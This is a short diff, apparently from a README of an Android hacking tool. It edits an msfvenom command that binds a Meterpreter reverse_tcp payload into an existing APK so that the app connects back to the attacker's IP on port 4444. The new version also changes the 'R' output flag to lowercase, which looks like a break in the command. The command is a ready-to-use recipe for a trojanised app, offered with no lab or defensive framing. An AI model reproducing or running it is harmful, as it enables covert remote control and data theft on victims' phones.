@@ -5,7 +5,7 @@ bash setup.sh
 ## paylod:-
 
 
-msfvenom -x (bind apk name) -p android/meterpreter/reverse_tcp LHOST=(your ip) LPORT=4444 R > /sdcard/apk_name.apk
+msfvenom -x (bind apk name) -p android/meterpreter/reverse_tcp LHOST=(your ip) LPORT=4444 r > /sdcard/apk_name.apk
 
 
 
